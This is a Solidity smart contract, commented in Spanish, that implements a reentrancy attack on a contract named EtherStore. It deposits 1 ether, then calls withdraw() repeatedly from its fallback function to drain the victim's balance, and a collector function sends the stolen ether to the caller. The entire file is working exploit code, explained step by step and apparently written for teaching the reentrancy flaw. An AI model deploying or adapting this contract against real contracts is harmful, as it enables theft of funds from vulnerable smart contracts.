// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 


contract Hacker {
    
    address immutable etherStore;
    
    constructor (address _etherStoreAddress)  {
        etherStore = _etherStoreAddress;
    }

    //función que usa el hacker para retrar fondos del contrato
    function collector() external {
        payable(msg.sender).transfer(address(this).balance);
    } 

    //función de inicio de ataque
    function attack() external payable {
        require(msg.value >= 1 ether);
        //llamammos a través de un  CCC la función deposit() del contrato EtherStore 
        //para fundear la cuenta de este contrato con 1 ether.
        (bool success,) =  etherStore.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(success);
        //llamamos a la función withdraw() del contrato Vicitima para iniciar la secuencia de hacking
        //cuando la función withdraw() en la linea 14 envia los ethers hacia este contrato, 
        //se activa la función fallback(), la cual entra nuevamente en la función withdraw(), 
        //la cual aún no termina de ejecutarse completamente, por lo que permite drenar el contrato. 
        (success,) = etherStore.call(abi.encodeWithSignature("withdraw()"));
        require(success);

    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }
    //donde sucede la magia. 
    //esta función es llamada al recibir el ether que se envia, pues llama nuevamente
    //a la función withdraw(), la misma aún no termina, por lo que el balance de esta cuenta 
    //contrato sigue siendo 1 ether, dando la posibilidad de seguir retirando ethers del contrato, 
    //siempre que tenga GAS suficiente para ejecutar las n iteraciones.     
    fallback() external payable {
        if (etherStore.balance >= 1 ether) {
            (bool success,) = etherStore.call(abi.encodeWithSignature("withdraw()"));
            require(success);
        }
    }

}